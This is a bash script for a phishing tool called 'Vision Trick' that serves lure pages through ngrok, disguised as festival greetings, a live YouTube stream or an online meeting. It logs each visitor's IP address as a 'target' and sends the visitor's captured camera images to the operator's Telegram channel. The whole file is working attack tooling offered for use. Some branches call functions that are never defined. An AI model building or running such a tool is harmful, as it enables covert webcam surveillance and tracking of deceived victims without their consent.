#!/bin/bash
# Vision Trick v1.1
# Powered by TechChip (Modified for Vision Trick)
# Credits to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

banner() { 
    clear
    printf "\e[1;36m__     _____ ____ ___ ___  _   _    _____ ____  ___ ____ _  __\e[0m\n"
    printf "\e[1;36m\ \   / /_ _/ ___|_ _/ _ \| \ | |  |_   _|  _ \|_ _/ ___| |/ /\e[0m\n"
    printf "\e[1;36m \ \ / / | |\___ \| | | | |  \| |    | | | |_) \| | |   | ' / \e[0m\n"
    printf "\e[1;36m  \ V /  | | ___) | | |_| | |\  |    | | |  _ < | | |___| . \ \e[0m\n"
    printf "\e[1;36m   \_/  |___|____/___\___/|_| \_|    |_| |_| \_\___\____|_|\_\  V1.1\e[0m\n"
    printf "\e[1;33m VisionTrick v1.1 \e[0m\n"
    printf "\e[1;92m KeepEye On Everywhere \e[0m\n"
    printf "\e[1;35m linktr.ee/ghostri13y | linktr.ee/0xtor.exe \e[0m\n"
    printf "\n"
}

check_dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
    command -v python3 > /dev/null 2>&1 || { echo >&2 "I require python3 but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1
}

start_server() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp > /dev/null 2>&1
    php -S localhost:3333 > /dev/null 2>&1 &
    sleep 3
}

start_ngrok() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting ngrok server...\e[0m\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link is not generating, check following possible reasons: \e[0m\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using Android, turn hotspot on\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command: killall ngrok\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
        exit 1
    else
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    fi
}

select_template() {
    printf "\n-----Choose a template----\n"
    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube TV\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
    default_option_template="1"
    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
    option_tem="${option_tem:-${default_option_template}}"
    if [[ $option_tem -eq 1 ]]; then
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
        fest_name="${fest_name//[[:space:]]/}"
    elif [[ $option_tem -eq 2 ]]; then
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
    elif [[ $option_tem -eq 3 ]]; then
        printf ""
    else
        printf "\e[1;93m [!] Invalid template option! Try again.\e[0m\n"
        sleep 1
        select_template
    fi
}

payload_ngrok() {
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
        sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
    elif [[ $option_tem -eq 2 ]]; then
        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
        sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
    else
        sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
    fi
    rm -rf index3.html
}

ngrok_server() {
    if [[ -e ngrok ]]; then
        echo ""
    else
        command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
        command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
        printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
        arch=$(uname -a | grep -o 'arm' | head -n1)
        arch2=$(uname -a | grep -o 'Android' | head -n1)
        arch3=$(uname -a | grep -o 'aarch64' | head -n1)
        arch4=$(uname -a | grep -o 'Darwin' | head -n1)
        if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] && [[ $arch4 != *'Darwin'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1

            if [[ -e ngrok-v3-stable-linux-arm.zip ]]; then
                unzip ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-v3-stable-linux-arm.zip
            else
                printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
                exit 1
            fi
        elif [[ $arch3 == *'aarch64'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip > /dev/null 2>&1

            if [[ -e ngrok-v3-stable-linux-arm64.zip ]]; then
                unzip ngrok-v3-stable-linux-arm64.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-v3-stable-linux-arm64.zip
            else
                printf "\e[1;93m[!] Download error...\e[0m\n"
                exit 1
            fi
        elif [[ $arch4 == *'Darwin'* ]]; then
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip > /dev/null 2>&1

            if [[ -e ngrok-v3-stable-darwin-arm64.zip ]]; then
                unzip ngrok-v3-stable-darwin-arm64.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-v3-stable-darwin-arm64.zip
            else
                printf "\e[1;93m[!] Download error...\e[0m\n"
                exit 1
            fi
        else
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
            if [[ -e ngrok-v3-stable-linux-amd64.zip ]]; then
                unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
                chmod +x ngrok
                rm -rf ngrok-v3-stable-linux-amd64.zip
            else
                printf "\e[1;93m[!] Download error... \e[0m\n"
                exit 1
            fi
        fi
    fi
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] Your ngrok "
        cat ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth > /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Direct link is not generating, check following possible reasons: \e[0m\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using Android, turn hotspot on\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command: killall ngrok\n"
        printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
        exit 1
    else
        printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
    fi
    payload_ngrok
    checkfound
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    while [ true ]; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf ip.txt
        fi

        sleep 0.5

        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Image captured and sent to Telegram!\e[0m\n"
            
            # Get the latest image file in the images/ directory
            latest_image=$(ls -t images/*.png 2>/dev/null | head -n 1)
            
            if [[ -n "$latest_image" ]]; then
                # Call the Python script and pass the image file path
                echo "$latest_image" | python3 tel.py
                if [[ $? -eq 0 ]]; then
                    printf "\e[1;92m[\e[0m+\e[1;92m] Image sent successfully!\e[0m\n"
                else
                    printf "\e[1;91m[!] Failed to send image.\e[0m\n"
                fi
            else
                printf "\e[1;91m[!] No images found in the images/ directory.\e[0m\n"
            fi
            
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

# Main script execution
banner
check_dependencies

# Prompt the user to input the Telegram bot token and channel ID
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram bot token: \e[0m' telegramBotToken
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your Telegram channel ID: \e[0m' telegramChannelId

# Validate the inputs
if [[ -z "$telegramBotToken" || -z "$telegramChannelId" ]]; then
    printf "\e[1;91m[!] Error: Bot token or channel ID is missing.\e[0m\n"
    exit 1
fi

# Update the post.php file with the provided bot token and channel ID
sed -i "s|YOUR_BOT_TOKEN|$telegramBotToken|g" post.php
sed -i "s|@mychannel|$telegramChannelId|g" post.php

# Continue with the rest of the script
printf "\n-----Choose tunnel server----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then
    command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    start
elif [[ $option_server -eq 1 ]]; then
    ngrok_server
else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    vision_trick
fi
